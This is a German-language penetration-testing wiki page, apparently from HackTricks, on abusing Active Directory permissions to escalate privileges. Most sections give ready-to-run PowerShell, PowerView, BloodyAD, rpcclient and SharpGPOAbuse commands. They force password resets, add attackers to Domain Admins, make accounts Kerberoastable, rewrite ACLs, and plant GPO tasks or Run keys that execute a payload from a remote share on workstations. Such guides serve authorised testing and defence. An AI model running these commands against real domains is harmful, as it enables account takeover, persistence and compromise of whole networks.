# Missbrauch von Active Directory ACLs/ACEs

{{#include ../../../banners/hacktricks-training.md}}

**Diese Seite ist hauptsächlich eine Zusammenfassung der Techniken aus** [**https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/abusing-active-directory-acls-aces**](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/abusing-active-directory-acls-aces) **und** [**https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/privileged-accounts-and-token-privileges**](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/privileged-accounts-and-token-privileges)**. Für weitere Details siehe die Originalartikel.**

## BadSuccessor


{{#ref}}
BadSuccessor.md
{{#endref}}

## **GenericAll-Rechte auf Benutzer**

Dieses Privileg gewährt einem Angreifer die volle Kontrolle über ein Ziel-Benutzerkonto. Sobald `GenericAll`-Rechte mit dem Befehl `Get-ObjectAcl` bestätigt sind, kann ein Angreifer:

- **Ändern des Passworts des Ziels**: Mit `net user <username> <password> /domain` kann der Angreifer das Passwort des Benutzers zurücksetzen.
- **Targeted Kerberoasting**: Weise dem Benutzerkonto einen SPN zu, um es kerberoastable zu machen, und verwende dann Rubeus und targetedKerberoast.py, um die Ticket-Granting-Ticket (TGT) Hashes zu extrahieren und zu versuchen, sie zu knacken.
```bash
Set-DomainObject -Credential $creds -Identity <username> -Set @{serviceprincipalname="fake/NOTHING"}
.\Rubeus.exe kerberoast /user:<username> /nowrap
Set-DomainObject -Credential $creds -Identity <username> -Clear serviceprincipalname -Verbose
```
- **Targeted ASREPRoasting**: Deaktivieren Sie pre-authentication für den Benutzer, wodurch dessen Konto für ASREPRoasting anfällig wird.
```bash
Set-DomainObject -Identity <username> -XOR @{UserAccountControl=4194304}
```
## **GenericAll-Rechte an einer Gruppe**

Dieses Privileg ermöglicht einem Angreifer, Gruppenmitgliedschaften zu manipulieren, wenn er `GenericAll`-Rechte an einer Gruppe wie `Domain Admins` hat. Nachdem er den Distinguished Name der Gruppe mit `Get-NetGroup` ermittelt hat, kann der Angreifer:

- **Sich selbst zur `Domain Admins`-Gruppe hinzufügen**: Dies kann über direkte Befehle oder mithilfe von Modulen wie Active Directory oder PowerSploit erfolgen.
```bash
net group "domain admins" spotless /add /domain
Add-ADGroupMember -Identity "domain admins" -Members spotless
Add-NetGroupUser -UserName spotless -GroupName "domain admins" -Domain "offense.local"
```
- Von Linux aus kannst du auch BloodyAD verwenden, um dich selbst zu beliebigen Gruppen hinzuzufügen, wenn du GenericAll/Write-Mitgliedschaft über sie hast. Wenn die Zielgruppe in „Remote Management Users“ verschachtelt ist, erhältst du sofort WinRM-Zugriff auf Hosts, die diese Gruppe berücksichtigen:
```bash
# Linux tooling example (BloodyAD) to add yourself to a target group
bloodyAD --host <dc-fqdn> -d <domain> -u <user> -p '<pass>' add groupMember "<Target Group>" <user>

# If the target group is member of "Remote Management Users", WinRM becomes available
netexec winrm <dc-fqdn> -u <user> -p '<pass>'
```
## **GenericAll / GenericWrite / Write on Computer/User**

Wenn diese Privilegien auf einem Computerobjekt oder einem Benutzerkonto vorhanden sind, erlauben sie:

- **Kerberos Resource-based Constrained Delegation**: Ermöglicht die Übernahme eines Computerobjekts.
- **Shadow Credentials**: Mit dieser Technik kann man sich als Computer- oder Benutzerkonto ausgeben, indem man die Privilegien ausnutzt, um Shadow Credentials zu erstellen.

## **WriteProperty on Group**

Wenn ein Benutzer `WriteProperty`-Rechte auf alle Objekte einer bestimmten Gruppe (z. B. `Domain Admins`) hat, kann er:

- **Sich selbst zur Domain Admins Group hinzufügen**: Erreichbar durch Kombination der Befehle `net user` und `Add-NetGroupUser`, ermöglicht diese Methode eine Privilegieneskalation innerhalb der Domain.
```bash
net user spotless /domain; Add-NetGroupUser -UserName spotless -GroupName "domain admins" -Domain "offense.local"; net user spotless /domain
```
## **Self (Self-Membership) on Group**

Dieses Privileg ermöglicht es Angreifern, sich selbst zu bestimmten Gruppen wie `Domain Admins` hinzuzufügen, indem sie Befehle verwenden, die die Gruppenmitgliedschaft direkt manipulieren. Mit der folgenden Befehlssequenz kann man sich selbst hinzufügen:
```bash
net user spotless /domain; Add-NetGroupUser -UserName spotless -GroupName "domain admins" -Domain "offense.local"; net user spotless /domain
```
## **WriteProperty (Self-Membership)**

Eine ähnliche Berechtigung, sie erlaubt Angreifern, sich direkt zu Gruppen hinzuzufügen, indem sie Gruppenattribute ändern, sofern sie das Recht `WriteProperty` auf diesen Gruppen besitzen. Die Bestätigung und Ausführung dieser Berechtigung erfolgen mit:
```bash
Get-ObjectAcl -ResolveGUIDs | ? {$_.objectdn -eq "CN=Domain Admins,CN=Users,DC=offense,DC=local" -and $_.IdentityReference -eq "OFFENSE\spotless"}
net group "domain admins" spotless /add /domain
```
## **ForceChangePassword**

Wenn man das `ExtendedRight` an einem Benutzer für `User-Force-Change-Password` hat, ermöglicht dies das Zurücksetzen des Passworts, ohne das aktuelle Passwort zu kennen. Die Überprüfung dieses Rechts und dessen Ausnutzung kann über PowerShell oder alternative Kommandozeilentools erfolgen und bietet mehrere Methoden, das Passwort eines Benutzers zurückzusetzen, einschließlich interactive sessions und one-liners für non-interactive Umgebungen. Die Befehle reichen von einfachen PowerShell-Aufrufen bis zur Verwendung von `rpcclient` unter Linux und zeigen die Vielseitigkeit der attack vectors.
```bash
Get-ObjectAcl -SamAccountName delegate -ResolveGUIDs | ? {$_.IdentityReference -eq "OFFENSE\spotless"}
Set-DomainUserPassword -Identity delegate -Verbose
Set-DomainUserPassword -Identity delegate -AccountPassword (ConvertTo-SecureString '123456' -AsPlainText -Force) -Verbose
```

```bash
rpcclient -U KnownUsername 10.10.10.192
> setuserinfo2 UsernameChange 23 'ComplexP4ssw0rd!'
```
## **WriteOwner an einer Gruppe**

Wenn ein Angreifer feststellt, dass er über eine Gruppe `WriteOwner`-Rechte besitzt, kann er die Eigentümerschaft der Gruppe auf sich selbst ändern. Dies ist besonders wirkungsvoll, wenn es sich bei der betreffenden Gruppe um `Domain Admins` handelt, da eine Änderung des Eigentümers eine weitergehende Kontrolle über Gruppenattribute und Mitgliedschaften ermöglicht. Der Vorgang umfasst das Identifizieren des korrekten Objekts mittels `Get-ObjectAcl` und anschließend die Verwendung von `Set-DomainObjectOwner`, um den Eigentümer entweder per SID oder per Name zu ändern.
```bash
Get-ObjectAcl -ResolveGUIDs | ? {$_.objectdn -eq "CN=Domain Admins,CN=Users,DC=offense,DC=local" -and $_.IdentityReference -eq "OFFENSE\spotless"}
Set-DomainObjectOwner -Identity S-1-5-21-2552734371-813931464-1050690807-512 -OwnerIdentity "spotless" -Verbose
Set-DomainObjectOwner -Identity Herman -OwnerIdentity nico
```
## **GenericWrite auf Benutzer**

Diese Berechtigung erlaubt einem Angreifer, Benutzerattribute zu ändern. Konkret kann der Angreifer mit `GenericWrite`-Zugriff den Pfad des Anmeldeskripts eines Benutzers ändern, um bei der Benutzeranmeldung ein bösartiges Skript auszuführen. Dies wird erreicht, indem der `Set-ADObject`-Befehl verwendet wird, um die Eigenschaft `scriptpath` des Zielbenutzers so zu aktualisieren, dass sie auf das Skript des Angreifers zeigt.
```bash
Set-ADObject -SamAccountName delegate -PropertyName scriptpath -PropertyValue "\\10.0.0.5\totallyLegitScript.ps1"
```
## **GenericWrite on Group

Mit diesem Privileg können Angreifer die Gruppenmitgliedschaft manipulieren, z. B. sich selbst oder andere Benutzer zu bestimmten Gruppen hinzufügen. Dieser Prozess beinhaltet das Erstellen eines credential object, dessen Verwendung, um Benutzer einer Gruppe hinzuzufügen oder zu entfernen, und die Überprüfung der Mitgliedschaftsänderungen mit PowerShell-Befehlen.
```bash
$pwd = ConvertTo-SecureString 'JustAWeirdPwd!$' -AsPlainText -Force
$creds = New-Object System.Management.Automation.PSCredential('DOMAIN\username', $pwd)
Add-DomainGroupMember -Credential $creds -Identity 'Group Name' -Members 'username' -Verbose
Get-DomainGroupMember -Identity "Group Name" | Select MemberName
Remove-DomainGroupMember -Credential $creds -Identity "Group Name" -Members 'username' -Verbose
```
## **WriteDACL + WriteOwner**

Wenn ein Angreifer ein AD-Objekt besitzt und `WriteDACL`-Berechtigungen darauf hat, kann er sich `GenericAll`-Berechtigungen für das Objekt gewähren. Dies wird durch ADSI-Manipulation erreicht, wodurch volle Kontrolle über das Objekt und die Möglichkeit entsteht, seine Gruppenmitgliedschaften zu ändern. Trotz­dem bestehen Einschränkungen beim Versuch, diese Berechtigungen mit den `Set-Acl` / `Get-Acl`-Cmdlets des Active Directory-Moduls auszunutzen.
```bash
$ADSI = [ADSI]"LDAP://CN=test,CN=Users,DC=offense,DC=local"
$IdentityReference = (New-Object System.Security.Principal.NTAccount("spotless")).Translate([System.Security.Principal.SecurityIdentifier])
$ACE = New-Object System.DirectoryServices.ActiveDirectoryAccessRule $IdentityReference,"GenericAll","Allow"
$ADSI.psbase.ObjectSecurity.SetAccessRule($ACE)
$ADSI.psbase.commitchanges()
```
## **Replikation in der Domain (DCSync)**

Der DCSync-Angriff nutzt spezifische Replikationsberechtigungen in der Domain, um einen Domain Controller zu imitieren und Daten zu synchronisieren, einschließlich Benutzeranmeldeinformationen. Diese mächtige Technik erfordert Berechtigungen wie `DS-Replication-Get-Changes` und ermöglicht Angreifern, sensible Informationen aus der AD-Umgebung zu extrahieren, ohne direkten Zugriff auf einen Domain Controller. [**Learn more about the DCSync attack here.**](../dcsync.md)

## GPO-Delegation <a href="#gpo-delegation" id="gpo-delegation"></a>

### GPO-Delegation

Delegierter Zugriff zur Verwaltung von Gruppenrichtlinienobjekten (GPOs) kann erhebliche Sicherheitsrisiken darstellen. Wenn einem Benutzer wie `offense\spotless` GPO-Verwaltungsrechte delegiert werden, kann dieser Privilegien wie **WriteProperty**, **WriteDacl** und **WriteOwner** besitzen. Diese Berechtigungen können zu böswilligen Zwecken missbraucht werden, wie mit PowerView identifiziert: `bash Get-ObjectAcl -ResolveGUIDs | ? {$_.IdentityReference -eq "OFFENSE\spotless"}`

### GPO-Berechtigungen auflisten

Um falsch konfigurierte GPOs zu identifizieren, können die Cmdlets von PowerSploit verkettet werden. Dadurch lässt sich entdecken, welche GPOs ein bestimmter Benutzer verwalten darf: `powershell Get-NetGPO | %{Get-ObjectAcl -ResolveGUIDs -Name $_.Name} | ? {$_.IdentityReference -eq "OFFENSE\spotless"}`

**Computer, auf die eine bestimmte Richtlinie angewendet wird**: Es ist möglich zu ermitteln, auf welche Computer ein bestimmtes GPO angewendet wird, was hilft, den möglichen Einflussbereich zu verstehen. `powershell Get-NetOU -GUID "{DDC640FF-634A-4442-BC2E-C05EED132F0C}" | % {Get-NetComputer -ADSpath $_}`

**Auf einen bestimmten Computer angewendete Richtlinien**: Um zu sehen, welche Richtlinien auf einen bestimmten Computer angewendet werden, können Befehle wie `Get-DomainGPO` verwendet werden.

**OUs, auf die eine bestimmte Richtlinie angewendet ist**: Die Identifizierung der Organisationseinheiten (OUs), die von einer Richtlinie betroffen sind, kann mit `Get-DomainOU` erfolgen.

Sie können auch das Tool [**GPOHound**](https://github.com/cogiceo/GPOHound) verwenden, um GPOs zu enumerieren und Probleme darin zu finden.

### Missbrauch von GPOs - New-GPOImmediateTask

Fehlkonfigurierte GPOs können ausgenutzt werden, um Code auszuführen, zum Beispiel durch das Erstellen einer sofortigen geplanten Aufgabe. Dadurch kann ein Benutzer der lokalen Administratorgruppe auf betroffenen Maschinen hinzugefügt werden, was die Privilegien erheblich erhöht:
```bash
New-GPOImmediateTask -TaskName evilTask -Command cmd -CommandArguments "/c net localgroup administrators spotless /add" -GPODisplayName "Misconfigured Policy" -Verbose -Force
```
### GroupPolicy module - Abuse GPO

Das GroupPolicy module, falls installiert, ermöglicht die Erstellung und Verknüpfung neuer GPOs sowie das Setzen von Preferences wie registry values, um backdoors auf betroffenen Computern auszuführen. Diese Methode erfordert, dass das GPO aktualisiert wird und ein Benutzer sich am Computer anmeldet, damit die Ausführung erfolgt:
```bash
New-GPO -Name "Evil GPO" | New-GPLink -Target "OU=Workstations,DC=dev,DC=domain,DC=io"
Set-GPPrefRegistryValue -Name "Evil GPO" -Context Computer -Action Create -Key "HKLM\Software\Microsoft\Windows\CurrentVersion\Run" -ValueName "Updater" -Value "%COMSPEC% /b /c start /b /min \\dc-2\software\pivot.exe" -Type ExpandString
```
### SharpGPOAbuse - Abuse GPO

SharpGPOAbuse bietet eine Methode, vorhandene GPOs zu missbrauchen, indem Aufgaben hinzugefügt oder Einstellungen geändert werden, ohne neue GPOs erstellen zu müssen. Dieses Tool erfordert die Änderung bestehender GPOs oder die Verwendung von RSAT-Tools, um neue zu erstellen, bevor Änderungen angewendet werden:
```bash
.\SharpGPOAbuse.exe --AddComputerTask --TaskName "Install Updates" --Author NT AUTHORITY\SYSTEM --Command "cmd.exe" --Arguments "/c \\dc-2\software\pivot.exe" --GPOName "PowerShell Logging"
```
### Richtlinienaktualisierung erzwingen

GPO-Aktualisierungen erfolgen in der Regel etwa alle 90 Minuten. Um diesen Prozess zu beschleunigen, insbesondere nach einer Änderung, kann auf dem Zielrechner der Befehl `gpupdate /force` verwendet werden, um eine sofortige Richtlinienaktualisierung zu erzwingen. Dieser Befehl stellt sicher, dass Änderungen an GPOs angewendet werden, ohne auf den nächsten automatischen Aktualisierungszyklus zu warten.

### Unter der Haube

Bei der Überprüfung der Scheduled Tasks für eine bestimmte GPO, wie der `Misconfigured Policy`, lässt sich die Hinzufügung von Tasks wie `evilTask` feststellen. Diese Tasks werden durch Skripte oder Kommandozeilentools erstellt und zielen darauf ab, das Systemverhalten zu ändern oder Privilegien zu eskalieren.

Die Struktur des Tasks, wie sie in der von `New-GPOImmediateTask` erzeugten XML-Konfigurationsdatei dargestellt ist, zeigt die Details des geplanten Tasks — einschließlich des auszuführenden Befehls und seiner Trigger. Diese Datei zeigt, wie Scheduled Tasks innerhalb von GPOs definiert und verwaltet werden und bietet eine Möglichkeit, beliebige Befehle oder Skripte im Rahmen der Durchsetzung von Richtlinien auszuführen.

### Benutzer und Gruppen

GPOs erlauben außerdem die Manipulation von Benutzer- und Gruppenmitgliedschaften auf Zielsystemen. Durch direkte Bearbeitung der Users and Groups-Policy-Dateien können Angreifer Benutzer zu privilegierten Gruppen hinzufügen, wie etwa der lokalen `administrators`-Gruppe. Dies ist durch die Delegation von GPO-Verwaltungsberechtigungen möglich, die die Änderung von Policy-Dateien zum Hinzufügen neuer Benutzer oder zur Anpassung von Gruppenmitgliedschaften zulässt.

Die XML-Konfigurationsdatei für Users and Groups beschreibt, wie diese Änderungen umgesetzt werden. Durch das Hinzufügen von Einträgen in diese Datei können bestimmte Benutzer erhöhte Rechte auf den betroffenen Systemen erhalten. Diese Methode bietet einen direkten Weg zur Privilegieneskalation durch GPO-Manipulation.

Außerdem können weitere Methoden zum Ausführen von Code oder zur Aufrechterhaltung von Persistenz in Betracht gezogen werden, wie etwa das Verwenden von logon/logoff-Skripten, das Ändern von Registryschlüsseln für Autoruns, die Installation von Software über .msi-Dateien oder das Bearbeiten von Service-Konfigurationen. Diese Techniken bieten verschiedene Wege, um durch Missbrauch von GPOs Zugang zu erhalten und Zielsysteme zu kontrollieren.

## Referenzen

- [https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/abusing-active-directory-acls-aces](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/abusing-active-directory-acls-aces)
- [https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/privileged-accounts-and-token-privileges](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/privileged-accounts-and-token-privileges)
- [https://wald0.com/?p=112](https://wald0.com/?p=112)
- [https://learn.microsoft.com/en-us/dotnet/api/system.directoryservices.activedirectoryrights?view=netframework-4.7.2](https://learn.microsoft.com/en-us/dotnet/api/system.directoryservices.activedirectoryrights?view=netframework-4.7.2)
- [https://blog.fox-it.com/2018/04/26/escalating-privileges-with-acls-in-active-directory/](https://blog.fox-it.com/2018/04/26/escalating-privileges-with-acls-in-active-directory/)
- [https://adsecurity.org/?p=3658](https://adsecurity.org/?p=3658)
- [https://learn.microsoft.com/en-us/dotnet/api/system.directoryservices.activedirectoryaccessrule.-ctor?view=netframework-4.7.2#System_DirectoryServices_ActiveDirectoryAccessRule\_\_ctor_System_Security_Principal_IdentityReference_System_DirectoryServices_ActiveDirectoryRights_System_Security_AccessControl_AccessControlType\_](https://learn.microsoft.com/en-us/dotnet/api/system.directoryservices.activedirectoryaccessrule.-ctor?view=netframework-4.7.2#System_DirectoryServices_ActiveDirectoryAccessRule__ctor_System_Security_Principal_IdentityReference_System_DirectoryServices_ActiveDirectoryRights_System_Security_AccessControl_AccessControlType_)

{{#include ../../../banners/hacktricks-training.md}}
